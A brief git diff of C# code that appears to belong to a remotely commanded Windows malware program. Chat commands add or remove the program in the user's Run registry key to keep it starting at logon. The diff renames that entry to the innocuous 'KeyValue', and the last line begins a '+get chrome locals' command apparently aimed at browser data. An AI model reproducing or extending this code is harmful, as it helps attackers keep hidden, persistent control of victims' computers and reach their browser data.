@@ -46,13 +46,13 @@ namespace uwu_poggy_woggy_boy
             if (message.Content.StartsWith("+startup true"))
             {
                 Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                key.SetValue("UwUOwOHehe", $@"{System.Windows.Forms.Application.ExecutablePath}");
+                key.SetValue("KeyValue", $@"{System.Windows.Forms.Application.ExecutablePath}");
             }
 
             if (message.Content.StartsWith("+startup false"))
             {
                 Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                key.DeleteValue("UwUOwOHehe", false);
+                key.DeleteValue("KeyValue", false);
             }
 
             if (message.Content == "+get chrome locals")
